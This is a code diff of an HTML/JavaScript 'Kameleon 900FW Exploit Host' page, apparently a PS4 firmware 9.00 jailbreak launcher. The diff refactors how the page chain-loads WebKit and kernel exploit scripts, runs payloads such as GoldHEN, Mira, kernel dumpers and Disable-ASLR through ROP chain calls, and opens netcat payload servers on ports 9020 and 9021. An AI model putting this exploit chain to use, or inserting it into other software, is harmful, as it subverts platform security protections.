@@ -1,6 +1,6 @@
 <html>
 <head>
-<title>Kameleon 900FW Exploit Host (Manual Method) Lite Hybrid</title>
+<title>Kameleon 900FW Exploit Host (Manual Method) Lite</title>
 <link rel="shortcut icon" href="favicon.ico"></link>
 <link rel="stylesheet" href="btn.css">
 <style>
@@ -17,17 +17,65 @@ if (window.applicationCache.status=='0')
 }
 //Initialization of variables
 var payloadData = "";
-var array = "";
 var PLfile = "";
 localStorage.setItem("ipaddress","127.0.0.1");
-sessionStorage.setItem("isbinserver","no");
-sessionStorage.setItem("isnetcat","no");
-sessionStorage.setItem("islinux","no");
-sessionStorage.setItem("OOBdone","no");
-sessionStorage.setItem("ismira","no");
+sessionStorage.setItem("isghenbinserver","no");
+sessionStorage.setItem("isWebKitdone","no");
+sessionStorage.setItem("pltype","");
 
+//Functionns
+function exec_payload()
+{
+if (sessionStorage.isghenbinserver == "no")
+{
+    if (sessionStorage.isWebKitdone == "no")
+    {
+        sessionStorage.pltype = "oob";
+        setTimeout(poc, 500);
+    }
+    else
+    {
+        loadPayloadData();
+    }
+}
+else
+{
+    LoadpayloadGoldHEN(PLfile);
+}
+}
 
-//Functions
+function exec_payload_gh()
+{
+    if (sessionStorage.isghenbinserver == "no")
+{
+        if (sessionStorage.isWebKitdone == "no")
+        {
+        sessionStorage.pltype = "oob";
+        setTimeout(poc, 500);
+        }
+        else
+        {
+        loadPayloadData();
+        }
+}
+else
+{
+    if (confirm(PLfile + " " +  "cannot be launched using GoldHEN Bin Server. Do you want to load via WebKit!?")) 
+    {
+        if (sessionStorage.isWebKitdone == "no")
+        {
+        sessionStorage.pltype = "oob";
+        setTimeout(poc, 500);
+        }
+        else
+        {
+        loadPayloadData();
+        }
+        sessionStorage.isghenbinserver = "yes";
+    }
+}
+}
+
 function pldone() 
 {
   msgs.innerHTML= LoadedMSG;
@@ -87,24 +135,20 @@ function checkbinserverstatus()
 	req.send();
 	req.onerror = function(){
 		msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>GoldHEN Bin Server Not Detected, Payloads Will Run Via WebKit!!!</h1>";
-		sessionStorage.isbinserver = "no";
-		return;
+		sessionStorage.isghenbinserver = "no";
 	};
 	req.onload = function(){
 	var responseJson = JSON.parse(req.responseText);
 	if (responseJson.status=="ready"){
 		msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>GoldHEN Bin Server Detected, Payloads Will Run Via Port 9090!!!</h1>";
-		sessionStorage.isbinserver = "yes";
-		return;
+		sessionStorage.isghenbinserver = "yes";
 		}
 	};
 }
 
 function loadPayloadData()
-    {
+{
         if (PLfile)
-	{
-        if (sessionStorage.OOBdone == "yes")
         {
         //----------------------------------------------------------------------------------------------
         //Buffer Array Method By Leeful
@@ -128,65 +172,19 @@ function loadPayloadData()
         var pthread = p.malloc(0x10);
         chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
         pldone();
+        sessionStorage.pltype = "";
         }
-      };
-
-	}
-        else
-        {
-            setTimeout(poc, 1500);
+        };
         }
-    }
-    }
+}
 
 //Payloads to be loaded using Sleirsgoevy Style
 function loadPayloadDataSleirs(pl) // preload payload data
 {
-if (sessionStorage.OOBdone != "yes")
+if (sessionStorage.isWebKitdone == "yes") //OOB or WebKit Exploit Done!!! TODO
 {
-    if (sessionStorage.ismira != "yes" && sessionStorage.isnetcat != "yes")
-    {
-    setTimeout(loadScript("netcat.js")
-     +loadScript("int64.js")
-     +loadScript("rop.js")
-     +loadScript("kexploit.js")
-     +loadScript("exploit.js")
-	 +loadScript("malloc.js")
-	 +loadScript("rop_sleirs.js")
-	 +loadScript("syscalls.js")
-	 +loadScript("syscalls2.js")
-     +loadScript(pl)
-	 +loadScript("jbc_ldr.js")
-     +loadScript("kexploit-launcher.js")
-	 +loadScript("relocator.js"),1500);
-     sessionStorage.islinux = "no";
-     pldone();
-
-    }
-    else
-    {
-    setTimeout(loadScript("netcat.js")
-     +loadScript("int64.js")
-     +loadScript("rop.js")
-     +loadScript("kexploit.js")
-     +loadScript("exploit.js")
-	 +loadScript("malloc.js")
-	 +loadScript("rop_sleirs.js")
-	 +loadScript("syscalls.js")
-	 +loadScript("syscalls2.js")
-     +loadScript(pl)
-	 +loadScript("mira_ldr.js")
-     +loadScript("kexploit-launcher.js")
-	 +loadScript("relocator.js"),1500);
-     sessionStorage.ismira = "no";
-     sessionStorage.isnetcat = "no";
-     pldone();
-    }
-}
-else
-{
-    if (sessionStorage.ismira != "yes" && sessionStorage.isnetcat != "yes")
-    {
+    if (sessionStorage.pltype == "linux")
+  {
 	setTimeout(loadScript("netcat.js")
 	+loadScript("malloc.js")
 	+loadScript("rop_sleirs.js")
@@ -195,11 +193,11 @@ else
 	+loadScript(pl)
 	+loadScript("jbc_ldr.js")
 	+loadScript("relocator.js"),1500);
-    sessionStorage.islinux = "no";
+    sessionStorage.pltype = "";
     pldone();
-    }
-    else
-    {
+  }
+  else if (sessionStorage.pltype == "binserver9021" || sessionStorage.pltype == "mira")
+  {
     setTimeout(loadScript("netcat.js")
 	+loadScript("malloc.js")
 	+loadScript("rop_sleirs.js")
@@ -208,10 +206,49 @@ else
 	+loadScript(pl)
 	+loadScript("mira_ldr.js")
 	+loadScript("relocator.js"),1500);
-    sessionStorage.ismira = "no";
-    sessionStorage.isnetcat = "no";
+    sessionStorage.pltype = "";
     pldone();
-    }
+  }
+
+}
+else //NO OOB or WebKit Exploit Done!!!
+{
+    if (sessionStorage.pltype == "linux")
+  {
+    setTimeout(loadScript("netcat.js")
+     +loadScript("exploit.js")
+	 +loadScript("malloc.js")
+	 +loadScript("rop_sleirs.js")
+	 +loadScript("syscalls.js")
+	 +loadScript("syscalls2.js")
+     +loadScript("jbc_ldr.js")
+     +loadScript(pl)
+     +loadScript("int64.js")
+     +loadScript("rop.js")
+     +loadScript("kexploit.js")
+     +loadScript("kexploit-launcher.js")
+     +loadScript("relocator.js"),1500);
+     sessionStorage.pltype = "";
+     pldone();
+  }
+  else if (sessionStorage.pltype == "binserver9021" || sessionStorage.pltype == "mira")
+  {
+    setTimeout(loadScript("netcat.js")
+    +loadScript("exploit.js")
+	 +loadScript("malloc.js")
+	 +loadScript("rop_sleirs.js")
+	 +loadScript("syscalls.js")
+	 +loadScript("syscalls2.js")
+     +loadScript("mira_ldr.js")
+     +loadScript(pl)
+     +loadScript("int64.js")
+     +loadScript("rop.js")
+     +loadScript("kexploit.js")
+     +loadScript("kexploit-launcher.js")
+     +loadScript("relocator.js"),1500);
+     sessionStorage.pltype = "";
+     pldone();
+  }
 }
 }
 
@@ -320,87 +357,80 @@ function LoadpayloadGoldHEN(PLfile){ //Loading Payload via Payload Param.
         chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
     }
     chain.run();
-    sessionStorage.isnetcat = "no";
     awaitpl();
 }
 
-function load_binserver9021(){
+function load_binserver9021()
+{
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NetCat Bin Server Port 9021!!!</h1>";
 LoadedMSG="You Can Send Now Payloads Via Netcat To Port 9021";
-PLfile = "pl_mira_ldr.bin";
-if (sessionStorage.isbinserver == "no")
+PLfile = "mira_ldr.bin"; //GoldHEN Bin Server Only
+sessionStorage.pltype = "binserver9021";
+
+if (sessionStorage.isghenbinserver == "yes")
 {
-    sessionStorage.isnetcat = "yes";
-    loadPayloadDataSleirs("");
+LoadpayloadGoldHEN(PLfile);
 }
 else
 {
-    LoadpayloadGoldHEN(PLfile);
+loadPayloadDataSleirs("");
 }
 }
 
 function load_binserver9020()
 {
-    if (sessionStorage.isbinserver == "no")
+msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NetCat Bin Server Port 9020!!!</h1>";
+LoadedMSG="You Can Send Now Payloads Via Netcat To Port 9020";
+sessionStorage.pltype = "binserver9020";
+
+if (sessionStorage.isghenbinserver == "yes")
+{
+    if (confirm("Bin Server Port 9020 cannot be launched using GoldHEN Bin Server. Do you want to load via WebKit!?")) 
     {
-    msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NetCat Bin Server Port 9020!!!</h1>";
-    if (sessionStorage.OOBdone == "yes")
-    {
-    
-       exec_binserver9020();
+        if (sessionStorage.isWebKitdone == "no")
+        {
+        setTimeout(poc, 500);
+        }
+        else
+        {
+        exec_binserver9020();
+        }
+        sessionStorage.isghenbinserver = "yes";
     }
-    else
-    {
-        sessionStorage.isnetcat = "yes";
-        setTimeout(poc, 1500);
-        
-    }    
 }
 else
 {
-    if (confirm("Netcat 9020 cannot be launched using GoldHEN Bin Server. Do you want to load via WebKit!?")) 
-    {
-        msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NetCat Bin Server Port 9020!!!</h1>";
-        sessionStorage.isnetcat = "yes";
-        setTimeout(poc, 1500);
-    }
+        if (sessionStorage.isWebKitdone == "no")
+        {
+        setTimeout(poc, 500);
+        }
+        else
+        {
+        exec_binserver9020();
+        }
+        sessionStorage.isghenbinserver = "yes";
 }
-    
 }
 
-function load_goldhen225b7(){
-msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading GoldHEN v2.2.5b7 Please wait!!!</h1>";
-LoadedMSG="GoldHEN v2.2.5b7 Loaded";
-PLfile ="pl_goldhen225b7.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+function load_goldhen225b8(){
+msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading GoldHEN v2.2.5b8 Please wait!!!</h1>";
+LoadedMSG="GoldHEN v2.2.5b8 Loaded";
+PLfile ="pl_goldhen225b8.bin";
+exec_payload();
 }
 
 function load_goldhen224(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading GoldHEN v2.2.4 Please wait!!!</h1>";
 LoadedMSG="GoldHEN v2.2.4 Loaded";
 PLfile ="pl_goldhen224.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_mira(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Mira 9.00. Please wait!!!</h1>";
 LoadedMSG="Mira 9.00 Loaded";
 PLfile ="pl_mira.js";
-sessionStorage.ismira = "yes";
+sessionStorage.pltype = "mira";
 loadPayloadDataSleirs(PLfile);
 }
 
@@ -416,400 +446,198 @@ function load_pkg_backup(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PKG-BackUP v1.1. Please wait!</h1>";
 LoadedMSG="PKG-BackUP v1.1 Loaded";
 PLfile = "pl_pkg_backup.bin";
-
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_orbistoolbox(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Orbis Tool Box v1190. Please wait!</h1>";
 LoadedMSG="Orbis Tool Box v1190 Loaded";
 PLfile = "pl_OrbisToolbox.bin";
-
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_disableupdates(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Disable-Updates. Please wait!</h1>";
 LoadedMSG="Disable-Updates Loaded";
 PLfile = "pl_disableupdates.bin";
-
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_enableupdates(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Enable-Updates. Please wait!</h1>";
 LoadedMSG="Enable-Updates Loaded";
 PLfile = "pl_enableupdates.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_backup(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading DB-Backup. Please wait!</h1>";
 LoadedMSG="DB-Backup Loaded";
 PLfile = "pl_backup.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_app2usb(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading App-To-Usb. Please wait!</h1>";
 LoadedMSG="App-To-Usb Loaded";
 PLfile = "pl_app2usb.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_dumper(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading App Dumper. Please wait!</h1>";
 LoadedMSG="App Dumper Loaded";
 PLfile = "pl_appdumper.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    if (confirm(PLfile + " " +  "cannot be launched using GoldHEN Bin Server. Do you want to load via WebKit!?")) 
-    {
-        loadPayloadData();
-        sessionStorage.isbinserver = "yes";
-    }
-}
+exec_payload_gh();
 }
 
 function load_exitidu(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Exitidu. Please wait!</h1>";
 LoadedMSG="Exitidu Loaded";
 PLfile = "pl_exitidu.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_rifrenamer(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Rifrenamer. Please wait!</h1>";
 LoadedMSG="Rifrenamer Loaded";
 PLfile = "pl_rifrenamer.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_enablebrowser(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Enable-Browser. Please wait!</h1>";
 LoadedMSG="Enable-Browser Loaded";
 PLfile = "pl_enablebrowser.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_ftp(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Ftp. Please wait!</h1>";
 LoadedMSG="Ftp Loaded";
 PLfile = "pl_ftp.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_historyblocker(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading History-Blocker. Please wait!</h1>";
 LoadedMSG="History-Blocker Loaded";
 PLfile = "pl_historyblocker.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    if (confirm(PLfile + " " +  "cannot be launched using GoldHEN Bin Server. Do you want to load via WebKit!?")) 
-    {
-        loadPayloadData();
-        sessionStorage.isbinserver = "yes";
-    }
-}
+exec_payload_gh();
 }
 
 function load_kerneldumper(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Kernel-Dumper. Please wait!</h1>";
 LoadedMSG="Kernel-Dumper Loaded";
 PLfile = "pl_kerneldumper.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_moduledumper(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Kernel Module-Dumper. Please wait!</h1>";
 LoadedMSG="Kernel Module-Dumper Loaded";
 PLfile = "pl_moduledumper.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_uart(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Permanent UART. Please wait!</h1>";
 LoadedMSG="Permanent UART Loaded";
 PLfile = "pl_permanentuart.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 /////////////LINUX NAZKY
-function load_Linux1gb(){
+function load_Linux1gb()
+{
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NazkyYT Linux 1gb. Please wait!</h1>";
 LoadedMSG="NazkyYT Linux 1gb Loaded";
-sessionStorage.islinux = "yes";
-
-if (sessionStorage.isbinserver == "no")
-{
-    PLfile = "pl_LinuxLoader.js";
-    loadPayloadDataSleirs(PLfile);
-}
-else
-{
-    PLfile = "pl_LinuxLoader.bin";
-    LoadpayloadGoldHEN(PLfile);
-}
+sessionStorage.pltype = "linux";
+PLfile = "pl_Linux1gb.js";
+loadPayloadDataSleirs(PLfile);
 }
 
-function load_Linux2gb(){
+function load_Linux2gb()
+{
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NazkyYT Linux 2gb. Please wait!</h1>";
 LoadedMSG="NazkyYT Linux 2gb Loaded";
-sessionStorage.islinux = "yes";
-
-if (sessionStorage.isbinserver == "no")
-{
-    PLfile = "pl_LinuxLoader2gb.js";
-    loadPayloadDataSleirs(PLfile);
-}
-else
-{
-    PLfile = "pl_LinuxLoader2gb.bin";
-    LoadpayloadGoldHEN(PLfile);
-}
+sessionStorage.pltype = "linux";
+PLfile = "pl_Linux2gb.js";
+loadPayloadDataSleirs(PLfile);
 }
 
-function load_Linux3gb(){
+function load_Linux3gb()
+{
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NazkyYT Linux 3gb. Please wait!</h1>";
 LoadedMSG="NazkyYT Linux 3gb Loaded";
-sessionStorage.islinux = "yes";
-
-if (sessionStorage.isbinserver == "no")
-{
-    PLfile = "pl_LinuxLoader3gb.js";
-    loadPayloadDataSleirs(PLfile);
-}
-else
-{
-    PLfile = "pl_LinuxLoader3gb.bin";
-    LoadpayloadGoldHEN(PLfile);
-}
+sessionStorage.pltype = "linux";
+PLfile = "pl_Linux3gb.js";
+loadPayloadDataSleirs(PLfile);
 }
 
-function load_Linux4gb(){
+function load_Linux4gb()
+{
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NazkyYT Linux 4gb. Please wait!</h1>";
 LoadedMSG="NazkyYT Linux 4gb Loaded";
-sessionStorage.islinux = "yes";
-
-if (sessionStorage.isbinserver == "no")
-{
-    PLfile = "pl_LinuxLoader4gb.js";
-    loadPayloadDataSleirs(PLfile);
-}
-else
-{
-    PLfile = "pl_LinuxLoader4gb.bin";
-    LoadpayloadGoldHEN(PLfile);
-}
+sessionStorage.pltype = "linux";
+PLfile = "pl_Linux4gb.js";
+loadPayloadDataSleirs(PLfile);
 }
 
 function load_Linux5gb(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading NazkyYT Linux 5gb. Please wait!</h1>";
 LoadedMSG="NazkyYT Linux 5gb Loaded";
-sessionStorage.islinux = "yes";
-
-if (sessionStorage.isbinserver == "no")
-{
-    PLfile = "pl_LinuxLoader5gb.js";
-    loadPayloadDataSleirs(PLfile);
-}
-else
-{
-    PLfile = "pl_LinuxLoader5gb.bin";
-    LoadpayloadGoldHEN(PLfile);
-}
+sessionStorage.pltype = "linux";
+PLfile = "pl_Linux5gb.js";
+loadPayloadDataSleirs(PLfile);
 }
 
 /////////////LINUX PSXITA
-function load_psxita_Linux1gb(){
+function load_psxita_Linux1gb()
+{
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSXita Linux 1gb. Please wait!</h1>";
 LoadedMSG="PSXita Linux 1gb Loaded";
-sessionStorage.islinux = "yes";
-
-if (sessionStorage.isbinserver == "no")
-{
-    PLfile = "pl_psxita_LinuxLoader.js";
-    loadPayloadDataSleirs(PLfile);
-}
-else
-{
-    PLfile = "pl_psxita_LinuxLoader.bin";
-    LoadpayloadGoldHEN(PLfile);
-}
+sessionStorage.pltype = "linux";
+PLfile = "pl_psxita_1gb.js";
+loadPayloadDataSleirs(PLfile);
 }
 
 function load_psxita_Linux2gb(){
-msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSXita Linux 2gb. Please wait!</h1>";
 LoadedMSG="PSXita Linux 2gb Loaded";
-sessionStorage.islinux = "yes";
-
-if (sessionStorage.isbinserver == "no")
-{
-    PLfile = "pl_psxita_LinuxLoader2gb.js";
-    loadPayloadDataSleirs(PLfile);
-}
-else
-{
-    PLfile = "pl_psxita_LinuxLoader2gb.bin";
-    LoadpayloadGoldHEN(PLfile);
-}
+sessionStorage.pltype = "linux";
+PLfile = "pl_psxita_2gb.js";
+loadPayloadDataSleirs(PLfile);
 }
 
-function load_psxita_Linux3gb(){
-msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSXita Linux 3gb. Please wait!</h1>";
+function load_psxita_Linux3gb()
+{
 LoadedMSG="PSXita Linux 3gb Loaded";
-sessionStorage.islinux = "yes";
-
-if (sessionStorage.isbinserver == "no")
-{
-    PLfile = "pl_psxita_LinuxLoader3gb.js";
-    loadPayloadDataSleirs(PLfile);
-}
-else
-{
-    PLfile = "pl_psxita_LinuxLoader3gb.bin";
-    LoadpayloadGoldHEN(PLfile);
-}
+sessionStorage.pltype = "linux";
+PLfile = "pl_psxita_3gb.js";
+loadPayloadDataSleirs(PLfile);
 }
 
-function load_psxita_Linux4gb(){
-msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSXita Linux 4gb. Please wait!</h1>";
+function load_psxita_Linux4gb()
+{
 LoadedMSG="PSXita Linux 4gb Loaded";
-sessionStorage.islinux = "yes";
-
-if (sessionStorage.isbinserver == "no")
-{
-    PLfile = "pl_psxita_LinuxLoader4gb.js";
-    loadPayloadDataSleirs(PLfile);
-}
-else
-{
-    PLfile = "pl_psxita_LinuxLoader4gb.bin";
-    LoadpayloadGoldHEN(PLfile);
-}
+sessionStorage.pltype = "linux";
+PLfile = "pl_psxita_4gb.js";
+loadPayloadDataSleirs(PLfile);
 }
 
-function load_psxita_Linux5gb(){
-msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSXita Linux 5gb. Please wait!</h1>";
+function load_psxita_Linux5gb()
+{
 LoadedMSG="PSXita Linux 5gb Loaded";
-sessionStorage.islinux = "yes";
-
-if (sessionStorage.isbinserver == "no")
-{
-    PLfile = "pl_psxita_LinuxLoader5gb.js";
-    loadPayloadDataSleirs(PLfile);
-}
-else
-{
-    PLfile = "pl_psxita_LinuxLoader5gb.bin";
-    LoadpayloadGoldHEN(PLfile);
-}
+sessionStorage.pltype = "linux";
+PLfile = "pl_psxita_5gb.js";
+loadPayloadDataSleirs(PLfile);
 }
 
 /////////////LINUX PSXITA FOR PRO CONSOLES
 function load_psxita_pro_Linux1gb(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSXita-PRO Linux 1gb. Please wait!</h1>";
 LoadedMSG="PSXita-PRO Linux 1gb Loaded";
-sessionStorage.islinux = "yes";
+sessionStorage.pltype = "linux";
 PLfile = "pl_psxita_pro_1gb.js";
 loadPayloadDataSleirs(PLfile);
 }
@@ -817,7 +645,7 @@ loadPayloadDataSleirs(PLfile);
 function load_psxita_pro_Linux2gb(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSXita-PRO Linux 2gb. Please wait!</h1>";
 LoadedMSG="PSXita-PRO Linux 2gb Loaded";
-sessionStorage.islinux = "yes";
+sessionStorage.pltype = "linux";
 PLfile = "pl_psxita_pro_2gb.js";
 loadPayloadDataSleirs(PLfile);
 }
@@ -825,7 +653,7 @@ loadPayloadDataSleirs(PLfile);
 function load_psxita_pro_Linux3gb(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSXita-PRO Linux 3gb. Please wait!</h1>";
 LoadedMSG="PSXita-PRO Linux 3gb Loaded";
-sessionStorage.islinux = "yes";
+sessionStorage.pltype = "linux";
 PLfile = "pl_psxita_pro_3gb.js";
 loadPayloadDataSleirs(PLfile);
 }
@@ -833,7 +661,7 @@ loadPayloadDataSleirs(PLfile);
 function load_psxita_pro_Linux4gb(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading PSXita-PRO Linux 4gb. Please wait!</h1>";
 LoadedMSG="PSXita-PRO Linux 4gb Loaded";
-sessionStorage.islinux = "yes";
+sessionStorage.pltype = "linux";
 PLfile = "pl_psxita_pro_4gb.js";
 loadPayloadDataSleirs(PLfile);
 }
@@ -842,91 +670,49 @@ function load_whos_southbridge(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Whos That South-Bridge v2 . Please wait!</h1>";
 LoadedMSG="Whos That South-Bridge v2 Loaded";
 PLfile = "pl_wtsb.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_ps4debug(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading CTN Ps4Debug v1.0.15. Please wait!</h1>";
 LoadedMSG="CTN Ps4Debug v1.0.15 Loaded";
 PLfile = "pl_ps4debug.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_restore(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading DB-Restore. Please wait!</h1>";
 LoadedMSG="DB-Restore Loaded";
 PLfile = "pl_restore.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_todex(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Enable-Dex. Please wait!</h1>";
 LoadedMSG="ToDex Loaded";
 PLfile = "pl_todex.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_webrte(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading WebRTE. Please wait!</h1>";
 LoadedMSG="WebRTE Loaded";
 PLfile = "pl_webrte.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 function load_disableaslr(){
 msgs.innerHTML="<h1 style='font-size:25px;text-align:center;'>Loading Disable-ASLR. Please wait!</h1>";
 LoadedMSG="Disable-ASLR Loaded";
 PLfile = "pl_disableaslr.bin";
-if (sessionStorage.isbinserver == "no")
-{
-    loadPayloadData();
-}
-else
-{
-    LoadpayloadGoldHEN(PLfile);
-}
+exec_payload();
 }
 
 </script>
 </head>
 
 <body onload="checkbinserverstatus();">
-    <h1 id=msgs style='font-size:25px;text-align:center;color:white'>Kameleon 900FW Exploit Host (Manual Method) Hybrid</h1>
+    <h1 id=msgs style='font-size:25px;text-align:center;color:white'>Kameleon 900 Manual Lite ESP32-S2</h1>
     <div id=mymenu style="text-align:center;">
       <div text-align= center>Pass = <span id=passCounter></span>&nbsp;&nbsp;:&nbsp;&nbsp;Fail = <span id=failCounter></span></div>
       <div style="width:100%;font-size:20px;color:white">
@@ -934,66 +720,66 @@ else
       <div id="pldmenu" style=font-size:16px>
       <br>
       <div style=font-size:16px>BIN LOADER</div>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Receives .Bin payloads on port 9020 via NetCat'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_binserver9020(); return false">Binloader-9020</button>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Receives .Bin payloads on port 9021 via NetCat'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_binserver9021(); return false">Binloader-9021</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Receives .Bin payloads on port 9020 via NetCat'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_binserver9020(); return false">Binloader-9020</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Receives .Bin payloads on port 9021 via NetCat'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_binserver9021(); return false">Binloader-9021</button>
       <br>
       <div style=font-size:16px>GOLDHEN / MIRA</div>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='GoldHEN v2.2.5b7 (Latest) - By SiSTRo'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_goldhen225b7(); return false">GoldHEN v2.2.5b7 (Latest)</button>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='GoldHEN v2.2.4 - By SiSTRo'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_goldhen224(); return false">GoldHEN v2.2.4</button>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Mira For 9.00 - By Sleirsgoevy'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_mira(); return false">Mira 9.00</button>
